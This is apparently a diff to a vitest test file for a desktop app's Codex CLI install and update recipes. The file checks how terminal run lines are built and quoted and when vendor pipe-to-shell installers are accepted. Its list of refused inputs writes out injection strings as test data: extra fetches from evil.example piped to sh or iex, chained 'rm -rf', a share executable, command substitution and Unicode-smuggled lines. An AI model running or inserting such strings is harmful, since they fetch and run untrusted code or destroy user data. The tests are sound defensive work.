@@ -12,12 +12,15 @@
 // too, as its documented line, which names the one HTTPS address fixed in
 // code beside it, only after a confirmation that names that address's host.
 // It comes first, npm second. Every line ends its shell when its command
-// ends, so the surface that opened the tab sees it end and checks again.
+// ends, however it ends (in PowerShell an error or Ctrl+C too), so the
+// surface that opened the tab sees it end and checks again. An installer
+// command must be exactly one of the documented shapes filled in with its
+// address (review fix, 2026-10-10).
 import { describe, it, expect, vi } from 'vitest'
 import { codexInstallRecipes, codexInstallKind, CODEX_INSTALL_SOURCE_URL, CODEX_README_COMMIT } from '../../src/main/providers/codex'
 import {
   AccountsService, ConsumerLeaseRegistry, SecretHandleStore, recipeRunLine, installRecipeView, vendorScriptHost,
-  WINDOWS_RUN_LINE_END, POSIX_RUN_LINE_END,
+  WINDOWS_RUN_LINE_START, WINDOWS_RUN_LINE_END, POSIX_RUN_LINE_END, VENDOR_SCRIPT_SHAPES,
 } from '../../src/main/providers/core'
 import type { InstallRecipe, ProviderPackage } from '../../src/main/providers/core'
 import type { CapabilityPlatform } from '../../src/shared/providers'
@@ -27,6 +30,8 @@ const PS1_URL = 'https://chatgpt.com/codex/install.ps1'
 const SH_URL = 'https://chatgpt.com/codex/install.sh'
 const PS1_LINE = 'powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1 | iex"'
 const SH_LINE = 'curl -fsSL https://chatgpt.com/codex/install.sh | sh'
+/** A command as the Windows install tab types it: inside the try that ends the shell however it ends. */
+const WIN = (cmd: string) => `$failed = $true; try { ${cmd}; $failed = $false } catch { $_ } finally { if ($failed) { exit 1 } }; exit $LASTEXITCODE`
 
 describe('the Codex recipe registry', () => {
   it('every platform can install and update through a package manager the user confirms', () => {
@@ -87,6 +92,8 @@ describe('the Codex recipe registry', () => {
         expect(r.mayElevate, r.id).toBe(false)
         expect(r.note, r.id).toMatch(/downloads a script from chatgpt\.com and runs it/)
         expect(r.note, r.id).not.toMatch(/does not run it/)
+        // Its closing question would hold the tab open (ux review, 2026-10-10).
+        expect(r.note, r.id).toMatch(/When it asks whether to start Codex now, answer N: the app checks again when it ends\./)
       }
     }
   })
@@ -198,7 +205,7 @@ describe('the update offered is the one for the install sessions run', () => {
     expect(r).toMatchObject({ method: 'script', command: null, autoRunAllowed: true, scriptUrl: PS1_URL })
     expect(r.displayCommand).toBe(codexInstallRecipes('win32').find((x) => x.id === 'codex-script-install-ps1')!.displayCommand)
     expect(r.note).toMatch(/Updates a Codex this script installed/)
-    expect(recipeRunLine(r, 'win32')).toBe(`${PS1_LINE}; exit $LASTEXITCODE`)
+    expect(recipeRunLine(r, 'win32')).toBe(WIN(PS1_LINE))
     // Walk fix W8: the same for the sh installer, on both platforms it runs on.
     for (const p of ['darwin', 'linux'] as const) {
       const sh = codexInstallRecipes(p, { executable: '/Users/u/.codex/packages/standalone/current/bin/codex' }).find((x) => x.purpose === 'update')!
@@ -221,8 +228,8 @@ const byId = (p: CapabilityPlatform, id: string) => codexInstallRecipes(p).find(
 
 describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
   it('Windows: npm is typed as npm.cmd (PowerShell would load npm.ps1, which the default execution policy refuses), every argument single-quoted', () => {
-    expect(recipeRunLine(byId('win32', 'codex-npm-install'), 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex'; exit $LASTEXITCODE")
-    expect(recipeRunLine(byId('win32', 'codex-npm-update'), 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex@latest'; exit $LASTEXITCODE")
+    expect(recipeRunLine(byId('win32', 'codex-npm-install'), 'win32')).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex'"))
+    expect(recipeRunLine(byId('win32', 'codex-npm-update'), 'win32')).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex@latest'"))
   })
 
   it('macOS and Linux: npm unchanged, arguments single-quoted; brew on macOS', () => {
@@ -234,28 +241,44 @@ describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
     expect(recipeRunLine(byId('darwin', 'codex-brew-update'), 'darwin')).toBe("brew 'upgrade' '--cask' 'codex'; exit")
   })
 
-  it('every line ends its shell when its command ends (PowerShell with the exit code), once, so the tab is seen to end', () => {
-    expect(WINDOWS_RUN_LINE_END).toBe('; exit $LASTEXITCODE')
+  it('every line ends its shell however its command ends, so the tab is seen to end: PowerShell inside a try whose finally exits on an error or Ctrl+C, POSIX with exit', () => {
+    expect(WINDOWS_RUN_LINE_START).toBe('$failed = $true; try { ')
+    expect(WINDOWS_RUN_LINE_END).toBe('; $failed = $false } catch { $_ } finally { if ($failed) { exit 1 } }; exit $LASTEXITCODE')
     expect(POSIX_RUN_LINE_END).toBe('; exit')
     for (const p of platforms) {
-      const end = p === 'win32' ? WINDOWS_RUN_LINE_END : POSIX_RUN_LINE_END
       for (const r of codexInstallRecipes(p)) {
         const line = recipeRunLine(r, p)!
         expect(line, `${p} ${r.id}`).toBeDefined()
-        expect(line.endsWith(end), `${p} ${r.id}`).toBe(true)
-        expect(line.split('; exit').length, `${p} ${r.id}`).toBe(2)
+        if (p === 'win32') {
+          expect(line.startsWith(WINDOWS_RUN_LINE_START), r.id).toBe(true)
+          expect(line.endsWith(WINDOWS_RUN_LINE_END), r.id).toBe(true)
+          expect(line.slice(WINDOWS_RUN_LINE_START.length, -WINDOWS_RUN_LINE_END.length), r.id).not.toMatch(/exit|try|finally/)
+        } else {
+          expect(line.endsWith(POSIX_RUN_LINE_END), `${p} ${r.id}`).toBe(true)
+          expect(line.split('; exit').length, `${p} ${r.id}`).toBe(2)
+        }
       }
     }
   })
 
   it("OpenAI's installer is typed as the README writes it, character for character, then ended the same way", () => {
-    expect(recipeRunLine(byId('win32', 'codex-script-install-ps1'), 'win32')).toBe(`${PS1_LINE}; exit $LASTEXITCODE`)
+    expect(recipeRunLine(byId('win32', 'codex-script-install-ps1'), 'win32')).toBe(WIN(PS1_LINE))
     for (const p of ['darwin', 'linux'] as const) expect(recipeRunLine(byId(p, 'codex-script-install-sh'), p), p).toBe(`${SH_LINE}; exit`)
   })
 
-  it('a script gets a line only when its documented line names exactly its one fixed https address', () => {
+  it('a script gets a line only when its documented line is a documented shape around its one fixed https address', () => {
     expect(recipeRunLine(script(), 'linux')).toBe('curl -fsSL https://vendor.example/install.sh | sh; exit')
     expect(vendorScriptHost(script())).toBe('vendor.example')
+    // Each documented shape, filled in with the address, is accepted.
+    expect(VENDOR_SCRIPT_SHAPES.map((shape) => shape('https://vendor.example/install.x'))).toEqual([
+      'irm https://vendor.example/install.x | iex',
+      'curl -fsSL https://vendor.example/install.x | bash',
+      'curl -fsSL https://vendor.example/install.x | sh',
+      'powershell -ExecutionPolicy ByPass -c "irm https://vendor.example/install.x | iex"',
+    ])
+    for (const shape of VENDOR_SCRIPT_SHAPES) {
+      expect(vendorScriptHost(script({ displayCommand: shape('https://vendor.example/install.sh') }))).toBe('vendor.example')
+    }
     const refused: Array<[string, Partial<Runnable>]> = [
       ['no fixed address', { scriptUrl: undefined }],
       ['not https', { scriptUrl: 'http://vendor.example/install.sh', displayCommand: 'curl -fsSL http://vendor.example/install.sh | sh' }],
@@ -267,6 +290,17 @@ describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
       ['an address with a query', { scriptUrl: 'https://vendor.example/install.sh?x=1', displayCommand: 'curl https://vendor.example/install.sh?x=1 | sh' }],
       ['a second line', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh\nrm -rf x' }],
       ['a control character', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(27) }],
+      // bypass and injection MINOR 1 (2026-10-10): only the documented shapes.
+      ['a second fetch with no scheme', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh; curl -fsSL evil.example/x | sh' }],
+      ['a second irm with no scheme', { displayCommand: 'irm https://vendor.example/install.sh | iex; irm evil.example/x | iex' }],
+      ['a chained command', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh && rm -rf ~/x' }],
+      ['a command after it', { displayCommand: 'irm https://vendor.example/install.sh | iex; Remove-Item x' }],
+      ['a program on a share after it', { displayCommand: 'irm https://vendor.example/install.sh | iex; & ' + String.fromCharCode(92, 92) + 'evil' + String.fromCharCode(92) + 'x.exe' }],
+      ['a substitution', { displayCommand: 'curl -fsSL https://vendor.example/install.sh`id` | sh' }],
+      ['another downloader', { displayCommand: 'wget -qO- https://vendor.example/install.sh | sh' }],
+      ['another flag', { displayCommand: 'curl -fsSLk https://vendor.example/install.sh | sh' }],
+      ['a right-to-left mark', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(0x202e) }],
+      ['a line separator', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(0x2028) + 'id' }],
       ['not allowed to run', { autoRunAllowed: false }],
       ['an installer, not a script', { method: 'installer' }],
     ]
@@ -288,7 +322,7 @@ describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
 
   it('built from the argv, never from the text the user is shown', () => {
     const shown = { ...byId('win32', 'codex-npm-install'), displayCommand: 'npm install -g @openai/codex; Remove-Item x' }
-    expect(recipeRunLine(shown, 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex'; exit $LASTEXITCODE")
+    expect(recipeRunLine(shown, 'win32')).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex'"))
   })
 
   it('the program must be a plain word typed bare; anything else gets no line', () => {
@@ -298,7 +332,7 @@ describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
   })
 
   it('an argument is literal in that shell: quotes escaped, nothing expanded', () => {
-    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'win32')).toBe("npm.cmd 'it''s' '$(calc)' '@x/y'; exit $LASTEXITCODE")
+    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'win32')).toBe(WIN("npm.cmd 'it''s' '$(calc)' '@x/y'"))
     // POSIX: a single quote closes, is escaped, and reopens: 'it'\''s'.
     const BS = String.fromCharCode(92)
     expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'linux')).toBe(`npm 'it'${BS}''s' '$(calc)' '@x/y'; exit`)
@@ -343,8 +377,8 @@ describe('the accounts service hands the renderer a line only for a recipe main 
       }
     }
     const win = serviceOn('win32').installRecipes('codex')
-    expect(win.find((v) => v.id === 'codex-npm-install')!.runLine).toBe("npm.cmd 'install' '-g' '@openai/codex'; exit $LASTEXITCODE")
-    expect(win.find((v) => v.id === 'codex-script-install-ps1')!.runLine).toBe(`${PS1_LINE}; exit $LASTEXITCODE`)
+    expect(win.find((v) => v.id === 'codex-npm-install')!.runLine).toBe(WIN("npm.cmd 'install' '-g' '@openai/codex'"))
+    expect(win.find((v) => v.id === 'codex-script-install-ps1')!.runLine).toBe(WIN(PS1_LINE))
   })
 
   it('the update the service hands over is the one for the install its last check resolved (the path stays in main)', async () => {
